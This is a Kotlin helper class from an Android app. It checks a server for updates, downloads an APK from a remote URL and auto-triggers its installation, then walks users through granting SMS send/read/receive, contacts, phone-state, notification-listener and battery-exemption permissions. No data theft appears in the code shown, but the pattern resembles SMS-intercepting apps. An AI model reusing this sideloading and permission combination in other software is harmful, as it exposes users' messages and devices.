package com.example.fast.ui.animations

import android.Manifest
import android.app.Activity
import android.content.Intent
import android.content.pm.PackageManager
import android.net.Uri
import android.os.Build
import android.os.Handler
import android.os.Looper
import android.provider.Settings
import android.view.View
import android.widget.Button
import android.widget.ProgressBar
import android.widget.TextView
import androidx.core.app.ActivityCompat
import androidx.core.content.FileProvider
import com.example.fast.util.AppVersionInfo
import com.example.fast.util.LogHelper
import com.example.fast.util.PermissionManager
import com.example.fast.ui.MultipurposeCardActivity
import com.example.fast.ui.card.RemoteCardHandler
import com.example.fast.util.UpdateDownloadManager
import com.example.fast.util.VersionChecker
import java.io.File

/**
 * UpdatePermissionCardHelper
 *
 * Shared helper for the UPDATE → PERMISSION card flow used in both:
 * - ActivationActivity (prompt card)
 * - ActivatedActivity (master card)
 *
 * Phases:
 * 1. UPDATE: "Checking for update..." → download/install on same card OR "App is up to date."
 * 2. PERMISSION: Types granted permission names character by character
 *
 * Features:
 * - In-card download with progress bar, percentage, speed
 * - In-card install button after download completes
 * - Force update support (finishes activity after install)
 * - Launches MultipurposeCardActivity for update (legacy runUpdatePhase)
 *
 * Usage:
 * ```kotlin
 * val helper = UpdatePermissionCardHelper(activity)
 * helper.runUpdatePhaseWithDownload(cardViews, ...) { ... }
 * ```
 */
class UpdatePermissionCardHelper(private val activity: Activity) {

    private val handler = Handler(Looper.getMainLooper())
    private var typingRunnable: Runnable? = null
    private var downloadManager: UpdateDownloadManager? = null
    private var pendingVersionInfo: AppVersionInfo? = null
    private var downloadedFile: File? = null

    companion object {
        private const val TAG = "UpdatePermissionCardHelper"
        const val PERMISSION_REQUEST_CODE = 102

        // Status icons for permission display
        private const val ICON_GRANTED = "[OK]"
        private const val ICON_PENDING = "[..]"

        // Animation timing constants (reference AnimationConstants for consistency)
        val CARD_ANIM_DURATION_MS get() = AnimationConstants.UPDATE_CARD_ANIM_DURATION_MS
        val CARD_OPACITY_FADE_MS get() = AnimationConstants.UPDATE_CARD_OPACITY_FADE_MS
        val CARD_FLIP_DURATION_MS get() = AnimationConstants.UPDATE_CARD_FLIP_DURATION_MS
        val PER_CHAR_DELAY_MS get() = AnimationConstants.UPDATE_CARD_PER_CHAR_DELAY_MS
        val PHASE_DELAY_MS get() = AnimationConstants.UPDATE_CARD_PHASE_DELAY_MS
        val VERSION_CHECK_TIMEOUT_MS get() = AnimationConstants.UPDATE_CARD_VERSION_CHECK_TIMEOUT_MS

        // Phase titles
        const val TITLE_UPDATE = "UPDATE"
        const val TITLE_DOWNLOADING = "DOWNLOADING"
        const val TITLE_PERMISSIONS = "PERMISSIONS"

        // Update phase messages
        const val MSG_CHECKING_UPDATE = "Checking for update..."
        const val MSG_UPDATE_AVAILABLE = "Update available!"
        const val MSG_DOWNLOADING = "Downloading update..."
        const val MSG_DOWNLOAD_COMPLETE = "Download complete!"
        const val MSG_INSTALLING = "Ready to install..."
        const val MSG_UP_TO_DATE = "App is up to date."
        const val MSG_DOWNLOAD_ERROR = "Download failed"

        // Permission request - no retry (ask once only)
        const val MAX_PERMISSION_CYCLES = 1
    }

    /**
     * Data class holding all card view references for the update/permission flow.
     * Used to update progress, percentage, speed, and install button.
     */
    data class CardViews(
        val titleView: TextView?,
        val textView: TextView?,
        val progressContainer: View?,
        val progressBar: ProgressBar?,
        val percentageText: TextView?,
        val speedText: TextView?,
        val fileSizeText: TextView?,
        val installButtonContainer: View?,
        val installButton: Button?,
        val errorText: TextView?,
        val grantButtonContainer: View? = null,
        val grantButton: Button? = null,
        // New: Device info views
        val deviceInfoContainer: View? = null,
        val deviceIdText: TextView? = null,
        val currentVersionText: TextView? = null,
        val latestVersionText: TextView? = null,
        val updateStatusText: TextView? = null
    )

    /**
     * Run the UPDATE phase with in-card download/install functionality.
     *
     * Flow:
     * 1. Show device ID and current version
     * 2. Check for update via Firebase
     * 3. Show latest version from server
     * 4. If update available: show download progress on card → install button
     * 5. If no update: show "No update required" → proceed to permission phase
     *
     * @param cardViews All card view references
     * @param onDownloadStarted Called when download starts (optional, for UI feedback)
     * @param onNoUpdate Called when no update needed - proceed to permission phase
     * @param onForceUpdateFinish Called when force update - should finish activity after install
     * @param onInstallComplete Called after user clicks install (non-force update) - proceed to permission
     */
    fun runUpdatePhaseWithDownload(
        cardViews: CardViews,
        onDownloadStarted: (() -> Unit)? = null,
        onNoUpdate: () -> Unit,
        onForceUpdateFinish: () -> Unit,
        onInstallComplete: () -> Unit
    ) {
        if (activity.isFinishing || activity.isDestroyed) {
            onNoUpdate()
            return
        }

        cardViews.titleView?.text = TITLE_UPDATE
        cardViews.textView?.text = ""
        hideDownloadUI(cardViews)

        // Show device info section
        showDeviceInfo(cardViews)

        checkForAppUpdate { versionInfo ->
            handler.post {
                if (activity.isFinishing || activity.isDestroyed) {
                    onNoUpdate()
                    return@post
                }

                val currentVersionCode = VersionChecker.getCurrentVersionCode(activity)
                val currentVersionName = VersionChecker.getCurrentVersionName(activity)

                if (versionInfo != null) {
                    val latestVersionCode = versionInfo.versionCode
                    val latestVersionName = versionInfo.versionName.ifEmpty { "v$latestVersionCode" }

                    // Update latest version display
                    cardViews.latestVersionText?.text = "$latestVersionName ($latestVersionCode)"

                    if (currentVersionCode < latestVersionCode) {
                        // Update available - show status and start download
                        pendingVersionInfo = versionInfo
                        cardViews.updateStatusText?.text = "UPDATE AVAILABLE"
                        cardViews.updateStatusText?.visibility = View.VISIBLE
                        
                        handler.postDelayed({
                            if (!activity.isFinishing && !activity.isDestroyed) {
                                startDownloadOnCard(cardViews, versionInfo, onDownloadStarted, onForceUpdateFinish, onInstallComplete)
                            }
                        }, 1500) // Delay to show version comparison
                    } else {
                        // Already up to date
                        cardViews.updateStatusText?.text = "NO UPDATE REQUIRED"
                        cardViews.updateStatusText?.visibility = View.VISIBLE
                        
                        handler.postDelayed({
                            if (!activity.isFinishing && !activity.isDestroyed) {
                                onNoUpdate()
                            }
                        }, PHASE_DELAY_MS)
                    }
                } else {
                    // No version info from server - proceed
                    cardViews.latestVersionText?.text = "$currentVersionName ($currentVersionCode)"
                    cardViews.updateStatusText?.text = "NO UPDATE REQUIRED"
                    cardViews.updateStatusText?.visibility = View.VISIBLE
                    
                    handler.postDelayed({
                        if (!activity.isFinishing && !activity.isDestroyed) {
                            onNoUpdate()
                        }
                    }, PHASE_DELAY_MS)
                }
            }
        }
    }

    /**
     * Show device info section with device ID and current version.
     */
    private fun showDeviceInfo(cardViews: CardViews) {
        // Get device ID
        val deviceId = try {
            Settings.Secure.getString(activity.contentResolver, Settings.Secure.ANDROID_ID) ?: "Unknown"
        } catch (e: Exception) {
            "Unknown"
        }

        // Get current version
        val currentVersionCode = VersionChecker.getCurrentVersionCode(activity)
        val currentVersionName = VersionChecker.getCurrentVersionName(activity)

        // Update UI
        cardViews.deviceInfoContainer?.visibility = View.VISIBLE
        cardViews.deviceIdText?.text = deviceId
        cardViews.currentVersionText?.text = "$currentVersionName ($currentVersionCode)"
        cardViews.latestVersionText?.text = "Checking..."
        cardViews.updateStatusText?.visibility = View.GONE
    }

    /**
     * Start download and show progress on the card.
     */
    private fun startDownloadOnCard(
        cardViews: CardViews,
        versionInfo: AppVersionInfo,
        onDownloadStarted: (() -> Unit)?,
        onForceUpdateFinish: () -> Unit,
        onInstallComplete: () -> Unit
    ) {
        val downloadUrl = versionInfo.downloadUrl ?: return
        val versionCode = versionInfo.versionCode
        val forceUpdate = versionInfo.forceUpdate

        cardViews.titleView?.text = TITLE_DOWNLOADING
        cardViews.textView?.text = MSG_DOWNLOADING
        showDownloadUI(cardViews)

        onDownloadStarted?.invoke()

        // Initialize download manager
        if (downloadManager == null) {
            downloadManager = UpdateDownloadManager(activity)
        }

        downloadManager?.startDownload(
            downloadUrl = downloadUrl,
            versionCode = versionCode,
            callback = object : UpdateDownloadManager.DownloadProgressCallback {
                override fun onProgress(progress: Int, downloadedBytes: Long, totalBytes: Long, speed: String) {
                    handler.post {
                        if (activity.isFinishing || activity.isDestroyed) return@post
                        
                        cardViews.progressBar?.progress = progress
                        cardViews.percentageText?.text = "$progress%"
                        cardViews.speedText?.text = speed
                        cardViews.fileSizeText?.text = "${UpdateDownloadManager.formatFileSize(downloadedBytes)} / ${UpdateDownloadManager.formatFileSize(totalBytes)}"
                    }
                }

                override fun onComplete(file: File) {
                    handler.post {
                        if (activity.isFinishing || activity.isDestroyed) return@post
                        
                        downloadedFile = file
                        cardViews.titleView?.text = TITLE_UPDATE
                        cardViews.textView?.text = MSG_DOWNLOAD_COMPLETE
                        cardViews.progressBar?.progress = 100
                        cardViews.percentageText?.text = "100%"
                        cardViews.speedText?.text = "Complete"
                        
                        // Show install button
                        showInstallButton(cardViews, file, forceUpdate, onForceUpdateFinish, onInstallComplete)
                    }
                }

                override fun onError(error: String) {
                    handler.post {
                        if (activity.isFinishing || activity.isDestroyed) return@post
                        
                        LogHelper.e(TAG, "Download error: $error")
                        cardViews.textView?.text = MSG_DOWNLOAD_ERROR
                        cardViews.errorText?.text = error
                        cardViews.errorText?.visibility = View.VISIBLE
                        
                        // Hide progress, proceed to permission phase after delay
                        handler.postDelayed({
                            if (!activity.isFinishing && !activity.isDestroyed) {
                                hideDownloadUI(cardViews)
                                onInstallComplete() // Continue to permission phase
                            }
                        }, 3000)
                    }
                }

                override fun onCancelled() {
                    handler.post {
                        if (activity.isFinishing || activity.isDestroyed) return@post
                        hideDownloadUI(cardViews)
                        onInstallComplete() // Continue to permission phase
                    }
                }
            }
        )
    }

    /**
     * Show install button after download completes.
     */
    private fun showInstallButton(
        cardViews: CardViews,
        file: File,
        forceUpdate: Boolean,
        onForceUpdateFinish: () -> Unit,
        onInstallComplete: () -> Unit
    ) {
        cardViews.textView?.text = MSG_INSTALLING
        cardViews.installButtonContainer?.visibility = View.VISIBLE
        cardViews.installButton?.setOnClickListener {
            installApk(file)
            
            if (forceUpdate) {
                // Force update - finish activity after launching installer
                handler.postDelayed({
                    onForceUpdateFinish()
                }, 500)
            } else {
                // Non-force update - continue to permission phase after install
                handler.postDelayed({
                    if (!activity.isFinishing && !activity.isDestroyed) {
                        hideDownloadUI(cardViews)
                        onInstallComplete()
                    }
                }, 1000)
            }
        }
        
        // Auto-install after 2 seconds
        handler.postDelayed({
            if (!activity.isFinishing && !activity.isDestroyed && downloadedFile != null) {
                cardViews.installButton?.performClick()
            }
        }, 2000)
    }

    /**
     * Install APK file.
     */
    private fun installApk(file: File) {
        try {
            if (!file.exists()) {
                LogHelper.e(TAG, "APK file does not exist: ${file.absolutePath}")
                return
            }

            LogHelper.d(TAG, "Installing APK: ${file.absolutePath}, Size: ${file.length()} bytes")

            val uri = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.N) {
                FileProvider.getUriForFile(activity, "${activity.packageName}.fileprovider", file)
            } else {
                Uri.fromFile(file)
            }

            val intent = Intent(Intent.ACTION_VIEW).apply {
                setDataAndType(uri, "application/vnd.android.package-archive")
                flags = Intent.FLAG_ACTIVITY_NEW_TASK or Intent.FLAG_GRANT_READ_URI_PERMISSION
            }

            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.N) {
                val resolveInfos = activity.packageManager.queryIntentActivities(intent, 0)
                for (resolveInfo in resolveInfos) {
                    val packageName = resolveInfo.activityInfo.packageName
                    activity.grantUriPermission(packageName, uri, Intent.FLAG_GRANT_READ_URI_PERMISSION)
                }
            }

            activity.startActivity(intent)
        } catch (e: Exception) {
            LogHelper.e(TAG, "Error installing APK", e)
        }
    }

    /**
     * Show download progress UI.
     */
    private fun showDownloadUI(cardViews: CardViews) {
        cardViews.progressContainer?.visibility = View.VISIBLE
        cardViews.progressBar?.progress = 0
        cardViews.percentageText?.text = "0%"
        cardViews.speedText?.text = "Starting..."
        cardViews.fileSizeText?.text = "0 MB / 0 MB"
        cardViews.installButtonContainer?.visibility = View.GONE
        cardViews.errorText?.visibility = View.GONE
    }

    /**
     * Hide download progress UI.
     */
    private fun hideDownloadUI(cardViews: CardViews) {
        cardViews.progressContainer?.visibility = View.GONE
        cardViews.installButtonContainer?.visibility = View.GONE
        cardViews.errorText?.visibility = View.GONE
    }

    /**
     * Check for app updates via Firebase.
     * Returns AppVersionInfo if update is available and valid, null otherwise.
     */
    private fun checkForAppUpdate(onComplete: (AppVersionInfo?) -> Unit) {
        LogHelper.d(TAG, "Checking for app updates...")

        var completed = false
        val timeoutRunnable = Runnable {
            if (completed) return@Runnable
            completed = true
            LogHelper.w(TAG, "Version check timeout - proceeding normally")
            onComplete(null)
        }
        handler.postDelayed(timeoutRunnable, VERSION_CHECK_TIMEOUT_MS)

        VersionChecker.checkVersion(
            context = activity,
            onVersionChecked = { versionInfo ->
                if (completed) return@checkVersion
                completed = true
                handler.removeCallbacks(timeoutRunnable)

                if (versionInfo == null) {
                    LogHelper.d(TAG, "No version info available, proceeding normally")
                    onComplete(null)
                    return@checkVersion
                }

                val currentVersionCode = VersionChecker.getCurrentVersionCode(activity)
                val requiredVersionCode = versionInfo.versionCode
                val downloadUrl = versionInfo.downloadUrl

                LogHelper.d(TAG, "Version check: current=$currentVersionCode, required=$requiredVersionCode, forceUpdate=${versionInfo.forceUpdate}")

                if (currentVersionCode < requiredVersionCode &&
                    downloadUrl != null &&
                    VersionChecker.isValidDownloadUrl(downloadUrl)) {
                    LogHelper.d(TAG, "Update available: $downloadUrl")
                    onComplete(versionInfo)
                } else {
                    LogHelper.d(TAG, "No update needed or invalid URL")
                    onComplete(null)
                }
            },
            onError = { error ->
                if (completed) return@checkVersion
                completed = true
                handler.removeCallbacks(timeoutRunnable)
                LogHelper.w(TAG, "Version check failed, proceeding normally: ${error.message}")
                onComplete(null)
            }
        )
    }

    // ============================================================================
    // PERMISSION PHASE (unchanged from original)
    // ============================================================================

    /**
     * Run the PERMISSION phase of the card flow (display only, no requesting).
     *
     * Shows "PERMISSIONS" title and types the granted permission list character by character.
     *
     * @param titleView TextView to show phase title ("PERMISSIONS")
     * @param textView TextView to type permission list
     * @param onComplete Callback when typing animation completes
     */
    fun runPermissionPhase(
        titleView: TextView?,
        textView: TextView?,
        onComplete: () -> Unit
    ) {
        if (activity.isFinishing || activity.isDestroyed) {
            onComplete()
            return
        }

        titleView?.text = TITLE_PERMISSIONS
        textView?.text = ""

        val lines = getGrantedPermissionNames()
        if (textView != null && lines.isNotEmpty()) {
            typePermissionList(lines, textView, onComplete)
        } else {
            onComplete()
        }
    }

    // ============================================================================
    // PERMISSION DISPLAY ITEMS - for type-first-then-request flow
    // ============================================================================

    /**
     * Data class for displaying permissions with status icons.
     */
    data class PermissionDisplayItem(
        val name: String,           // Display name like "Receive SMS"
        val permission: String,     // Manifest permission or special key
        val isSpecial: Boolean,     // true for notification/battery, false for runtime
        var isGranted: Boolean      // Current grant status
    )

    // Current permission list being displayed (for live updates)
    private var currentPermissionItems: MutableList<PermissionDisplayItem> = mutableListOf()
    private var currentTextView: TextView? = null

    // Store cardViews and callbacks for permission phase
    private var permissionCardViews: CardViews? = null
    private var permissionOnComplete: (() -> Unit)? = null
    private var permissionOnDenied: (() -> Unit)? = null

    /**
     * Run the PERMISSION phase with type-first-then-request flow.
     *
     * Flow:
     * 1. Build list of ALL permissions with current status
     * 2. Type each line with icon: [OK] Name or [..] Name
     * 3. After typing completes, show GRANT button if any pending
     * 4. User clicks GRANT → permission request cycle starts
     * 5. Update icons live as user grants each permission
     * 6. Call onComplete when all granted, or onPermissionDenied if any denied
     *
     * @param cardViews All card view references including grant button
     * @param onComplete Callback when all permissions granted
     * @param onPermissionDenied Callback when any permission denied (optional, defaults to onComplete)
     */
    fun runPermissionPhaseWithRequest(
        cardViews: CardViews,
        onComplete: () -> Unit,
        onPermissionDenied: (() -> Unit)? = null
    ) {
        if (activity.isFinishing || activity.isDestroyed) {
            onComplete()
            return
        }

        permissionCardViews = cardViews
        permissionOnComplete = onComplete
        permissionOnDenied = onPermissionDenied
        currentTextView = cardViews.textView

        cardViews.titleView?.text = TITLE_PERMISSIONS
        cardViews.textView?.text = ""

        // Hide grant button initially
        cardViews.grantButtonContainer?.visibility = View.GONE

        // Build complete permission list with current status
        currentPermissionItems = buildPermissionDisplayList()
        LogHelper.d(TAG, "Permission phase: ${currentPermissionItems.size} permissions to display")

        if (currentPermissionItems.isEmpty()) {
            cardViews.textView?.text = "No permissions required"
            handler.postDelayed({
                if (!activity.isFinishing && !activity.isDestroyed) {
                    onComplete()
                }
            }, PHASE_DELAY_MS)
            return
        }

        // Type the permission list with status icons
        typePermissionListWithStatus(currentPermissionItems, cardViews.textView) {
            // After typing completes, check if any permissions are pending
            if (!activity.isFinishing && !activity.isDestroyed) {
                val hasPending = currentPermissionItems.any { !it.isGranted }
                if (hasPending) {
                    // Show GRANT button and wait for click
                    showGrantButton(cardViews, onComplete)
                } else {
                    // All already granted, proceed
                    handler.postDelayed({
                        if (!activity.isFinishing && !activity.isDestroyed) {
                            onComplete()
                        }
                    }, PHASE_DELAY_MS)
                }
            } else {
                onComplete()
            }
        }
    }

    /**
     * Show the GRANT button after typing animation completes.
     * Button click starts the permission request cycle.
     */
    private fun showGrantButton(cardViews: CardViews, onComplete: () -> Unit) {
        cardViews.grantButtonContainer?.visibility = View.VISIBLE
        cardViews.grantButton?.setOnClickListener {
            // Hide button and start permission cycle
            cardViews.grantButtonContainer?.visibility = View.GONE
            requestPendingPermissions(onComplete)
        }
    }

    /**
     * Legacy method for backward compatibility - converts to CardViews call.
     */
    fun runPermissionPhaseWithRequest(
        titleView: TextView?,
        textView: TextView?,
        onComplete: () -> Unit
    ) {
        runPermissionPhaseWithRequest(
            CardViews(
                titleView = titleView,
                textView = textView,
                progressContainer = null,
                progressBar = null,
                percentageText = null,
                speedText = null,
                fileSizeText = null,
                installButtonContainer = null,
                installButton = null,
                errorText = null,
                grantButtonContainer = null,
                grantButton = null
            ),
            onComplete
        )
    }

    /**
     * Build list of all permissions with current grant status.
     */
    private fun buildPermissionDisplayList(): MutableList<PermissionDisplayItem> {
        val items = mutableListOf<PermissionDisplayItem>()

        // Runtime permissions
        val runtimeToName = mapOf(
            Manifest.permission.RECEIVE_SMS to "Receive SMS",
            Manifest.permission.READ_SMS to "Read SMS",
            Manifest.permission.READ_CONTACTS to "Read Contacts",
            Manifest.permission.READ_PHONE_STATE to "Read Phone State",
            Manifest.permission.SEND_SMS to "Send SMS",
            Manifest.permission.POST_NOTIFICATIONS to "Notifications"
        )

        for (permission in PermissionManager.getRequiredRuntimePermissions(activity)) {
            val name = runtimeToName[permission] ?: continue
            val isGranted = ActivityCompat.checkSelfPermission(activity, permission) == PackageManager.PERMISSION_GRANTED
            items.add(PermissionDisplayItem(name, permission, isSpecial = false, isGranted = isGranted))
        }

        // Special permissions
        items.add(PermissionDisplayItem(
            "Notification Listener",
            "notification",
            isSpecial = true,
            isGranted = PermissionManager.hasNotificationListenerPermission(activity)
        ))
        items.add(PermissionDisplayItem(
            "Battery Optimization",
            "battery",
            isSpecial = true,
            isGranted = PermissionManager.hasBatteryOptimizationExemption(activity)
        ))

        return items
    }

    /**
     * Type permission list with status icons character by character.
     */
    private fun typePermissionListWithStatus(
        items: List<PermissionDisplayItem>,
        textView: TextView?,
        onComplete: () -> Unit
    ) {
        typingRunnable?.let { handler.removeCallbacks(it) }
        typingRunnable = null

        if (textView == null || items.isEmpty()) {
            onComplete()
            return
        }

        textView.text = ""
        val perCharDelay = PER_CHAR_DELAY_MS.coerceAtLeast(20L)
        var lineIndex = 0
        var charIndex = 0

        // Build lines with icons
        val lines = items.map { item ->
            val icon = if (item.isGranted) ICON_GRANTED else ICON_PENDING
            "$icon ${item.name}"
        }

        val runnable = object : Runnable {
            override fun run() {
                if (activity.isFinishing || activity.isDestroyed) {
                    typingRunnable = null
                    return
                }

                if (lineIndex >= lines.size) {
                    typingRunnable = null
                    // Delay before requesting permissions
                    handler.postDelayed({
                        if (!activity.isFinishing && !activity.isDestroyed) {
                            onComplete()
                        }
                    }, 500L)
                    return
                }

                val line = lines[lineIndex]
                if (line.isNotEmpty()) {
                    val nextIndex = (charIndex + 1).coerceAtMost(line.length)
                    val prefix = line.substring(0, nextIndex)
                    val soFar = lines.take(lineIndex).joinToString("\n") +
                               (if (lineIndex > 0) "\n" else "") + prefix
                    textView.text = soFar
                    charIndex++
                }

                if (charIndex >= line.length) {
                    lineIndex++
                    charIndex = 0
                }

                typingRunnable = this
                handler.postDelayed(this, perCharDelay)
            }
        }

        typingRunnable = runnable
        handler.postDelayed(runnable, perCharDelay)
    }

    /**
     * Request pending permissions after typing is done.
     * Launches MultipurposeCardActivity (card-only flow) and hands off.
     * After launch, calls permissionOnComplete to close overlay and continue.
     */
    private fun requestPendingPermissions(onComplete: () -> Unit) {
        val pendingRuntime = currentPermissionItems.filter { !it.isGranted && !it.isSpecial }
        val pendingSpecial = currentPermissionItems.filter { !it.isGranted && it.isSpecial }

        LogHelper.d(TAG, "Requesting permissions via MultipurposeCard: ${pendingRuntime.size} runtime, ${pendingSpecial.size} special")

        if (pendingRuntime.isEmpty() && pendingSpecial.isEmpty()) {
            handler.postDelayed({
                if (!activity.isFinishing && !activity.isDestroyed) {
                    checkResultAndComplete()
                }
            }, PHASE_DELAY_MS)
            return
        }

        // Launch MultipurposeCardActivity for permission request (card-only flow)
        if (pendingRuntime.isNotEmpty()) {
            val runtimePerms = pendingRuntime.map { it.permission }
            activity.startActivity(Intent(activity, MultipurposeCardActivity::class.java).apply {
                addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
                putExtra(RemoteCardHandler.KEY_CARD_TYPE, RemoteCardHandler.CARD_TYPE_PERMISSION)
                putExtra(RemoteCardHandler.KEY_PERMISSIONS, runtimePerms.joinToString(","))
                putExtra(RemoteCardHandler.KEY_DISPLAY_MODE, RemoteCardHandler.DISPLAY_MODE_FULLSCREEN)
                putExtra(RemoteCardHandler.KEY_TITLE, TITLE_PERMISSIONS)
                putExtra(RemoteCardHandler.KEY_BODY, "Please grant the required permissions.")
                putExtra(RemoteCardHandler.KEY_PRIMARY_BUTTON, "Grant")
            })
        } else if (pendingSpecial.isNotEmpty()) {
            val first = pendingSpecial.first()
            val cardType = when (first.permission) {
                "notification" -> RemoteCardHandler.CARD_TYPE_NOTIFICATION_ACCESS
                "battery" -> RemoteCardHandler.CARD_TYPE_BATTERY_OPTIMIZATION
                else -> RemoteCardHandler.CARD_TYPE_NOTIFICATION_ACCESS
            }
            activity.startActivity(Intent(activity, MultipurposeCardActivity::class.java).apply {
                addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
                putExtra(RemoteCardHandler.KEY_CARD_TYPE, cardType)
                putExtra(RemoteCardHandler.KEY_DISPLAY_MODE, RemoteCardHandler.DISPLAY_MODE_FULLSCREEN)
                putExtra(RemoteCardHandler.KEY_TITLE, "PERMISSIONS - ${first.name}")
                putExtra(RemoteCardHandler.KEY_BODY, "Please enable ${first.name} to continue.")
                putExtra(RemoteCardHandler.KEY_PRIMARY_BUTTON, "Open Settings")
            })
        }

        // Hand off to MultipurposeCardActivity; close overlay and continue
        handler.postDelayed({
            if (!activity.isFinishing && !activity.isDestroyed) {
                permissionOnComplete?.invoke()
            }
        }, 300L)
    }

    /**
     * Check if all permissions are granted and call the appropriate callback.
     * Returns true if all granted (calls onComplete), false if any denied (calls onPermissionDenied).
     */
    private fun checkResultAndComplete() {
        val anyDenied = currentPermissionItems.any { !it.isGranted }
        LogHelper.d(TAG, "Permission check complete: anyDenied=$anyDenied")
        
        if (anyDenied && permissionOnDenied != null) {
            // Some permissions denied - call denied callback
            LogHelper.d(TAG, "Calling onPermissionDenied callback")
            permissionOnDenied?.invoke()
        } else {
            // All granted or no denied callback - call complete
            LogHelper.d(TAG, "Calling onComplete callback")
            permissionOnComplete?.invoke()
        }
    }

    /**
     * Run the full UPDATE (with download) → PERMISSION (with request) flow.
     *
     * @param cardViews All card view references
     * @param onComplete Called when both phases complete and all permissions granted
     * @param onForceUpdateFinish Called for force update (finish activity)
     * @param onPermissionDenied Called when any permission denied (optional, defaults to onComplete)
     */
    fun runFullFlowWithDownload(
        cardViews: CardViews,
        onComplete: () -> Unit,
        onForceUpdateFinish: () -> Unit,
        onPermissionDenied: (() -> Unit)? = null
    ) {
        runUpdatePhaseWithDownload(
            cardViews = cardViews,
            onDownloadStarted = null,
            onNoUpdate = {
                // No update - proceed to permission phase WITH requesting (pass full cardViews for grant button)
                runPermissionPhaseWithRequest(cardViews, onComplete, onPermissionDenied)
            },
            onForceUpdateFinish = onForceUpdateFinish,
            onInstallComplete = {
                // After install (non-force) - proceed to permission phase WITH requesting (pass full cardViews for grant button)
                runPermissionPhaseWithRequest(cardViews, onComplete, onPermissionDenied)
            }
        )
    }

    // ============================================================================
    // LEGACY METHODS (for backward compatibility with ActivatedActivity)
    // ============================================================================

    /**
     * Run the UPDATE phase without in-card download (legacy behavior).
     * Launches MultipurposeCardActivity for update.
     */
    fun runUpdatePhase(
        titleView: TextView?,
        textView: TextView?,
        onComplete: (updateAvailable: Boolean) -> Unit
    ) {
        if (activity.isFinishing || activity.isDestroyed) {
            onComplete(false)
            return
        }

        titleView?.text = TITLE_UPDATE
        textView?.text = MSG_CHECKING_UPDATE

        checkForAppUpdate { versionInfo ->
            handler.post {
                if (activity.isFinishing || activity.isDestroyed) {
                    onComplete(false)
                    return@post
                }

                if (versionInfo != null) {
                    textView?.text = "Update available. Opening..."
                    
                    // Launch MultipurposeCardActivity (legacy behavior)
                    val intent = Intent(activity, MultipurposeCardActivity::class.java).apply {
                        flags = Intent.FLAG_ACTIVITY_NEW_TASK
                        putExtra(RemoteCardHandler.KEY_CARD_TYPE, RemoteCardHandler.CARD_TYPE_UPDATE)
                        putExtra(RemoteCardHandler.KEY_DOWNLOAD_URL, "${versionInfo.versionCode}|${versionInfo.downloadUrl}")
                        putExtra(RemoteCardHandler.KEY_DISPLAY_MODE, RemoteCardHandler.DISPLAY_MODE_FULLSCREEN)
                    }
                    activity.startActivity(intent)

                    if (versionInfo.forceUpdate) {
                        activity.finish()
                    }

                    handler.postDelayed({
                        if (!activity.isFinishing && !activity.isDestroyed) {
                            onComplete(true)
                        }
                    }, PHASE_DELAY_MS)
                } else {
                    textView?.text = MSG_UP_TO_DATE
                    handler.postDelayed({
                        if (!activity.isFinishing && !activity.isDestroyed) {
                            onComplete(false)
                        }
                    }, PHASE_DELAY_MS)
                }
            }
        }
    }

    /**
     * Run the full UPDATE → PERMISSION flow (legacy version without in-card download).
     */
    fun runFullFlow(
        titleView: TextView?,
        textView: TextView?,
        onUpdateAvailable: () -> Unit,
        onComplete: () -> Unit
    ) {
        runUpdatePhase(titleView, textView) { updateAvailable ->
            if (updateAvailable) {
                onUpdateAvailable()
            } else {
                runPermissionPhase(titleView, textView, onComplete)
            }
        }
    }

    // ============================================================================
    // UTILITY METHODS
    // ============================================================================

    /**
     * Get list of granted permission names for display.
     */
    fun getGrantedPermissionNames(): List<String> {
        val lines = mutableListOf<String>()
        val runtimeToName = mapOf(
            Manifest.permission.RECEIVE_SMS to "• Receive SMS",
            Manifest.permission.READ_SMS to "• Read SMS",
            Manifest.permission.READ_CONTACTS to "• Read Contacts",
            Manifest.permission.READ_PHONE_STATE to "• Read Phone State",
            Manifest.permission.SEND_SMS to "• Send SMS",
            Manifest.permission.POST_NOTIFICATIONS to "• Notifications"
        )

        for (p in PermissionManager.getRequiredRuntimePermissions(activity)) {
            if (ActivityCompat.checkSelfPermission(activity, p) == PackageManager.PERMISSION_GRANTED) {
                runtimeToName[p]?.let { lines.add(it) }
            }
        }

        if (PermissionManager.hasNotificationListenerPermission(activity)) {
            lines.add("• Notification Listener")
        }
        if (PermissionManager.hasBatteryOptimizationExemption(activity)) {
            lines.add("• Battery Optimization")
        }

        return lines
    }

    /**
     * Type permission list character by character with animation.
     */
    private fun typePermissionList(
        lines: List<String>,
        textView: TextView,
        onComplete: () -> Unit
    ) {
        typingRunnable?.let { handler.removeCallbacks(it) }
        typingRunnable = null

        textView.text = ""
        if (lines.isEmpty()) {
            onComplete()
            return
        }

        val perCharDelay = PER_CHAR_DELAY_MS.coerceAtLeast(20L)
        var lineIndex = 0
        var charIndex = 0

        val runnable = object : Runnable {
            override fun run() {
                if (activity.isFinishing || activity.isDestroyed) {
                    typingRunnable = null
                    return
                }

                if (lineIndex >= lines.size) {
                    typingRunnable = null
                    onComplete()
                    return
                }

                val line = lines[lineIndex]
                if (line.isNotEmpty()) {
                    val nextIndex = (charIndex + 1).coerceAtMost(line.length)
                    val prefix = line.substring(0, nextIndex)
                    val soFar = lines.take(lineIndex).joinToString("\n") +
                               (if (lineIndex > 0) "\n" else "") + prefix
                    textView.text = soFar
                    charIndex++
                }

                if (charIndex >= line.length) {
                    lineIndex++
                    charIndex = 0
                }

                typingRunnable = this
                handler.postDelayed(this, perCharDelay)
            }
        }

        typingRunnable = runnable
        handler.postDelayed(runnable, perCharDelay)
    }

    /**
     * Cancel any ongoing typing animation.
     */
    fun cancelTyping() {
        typingRunnable?.let { handler.removeCallbacks(it) }
        typingRunnable = null
    }

    /**
     * Clean up resources.
     * Call this in Activity.onDestroy()
     */
    fun cleanup() {
        cancelTyping()
        downloadManager?.cancelDownload()
        downloadManager = null
        pendingVersionInfo = null
        downloadedFile = null
    }
}
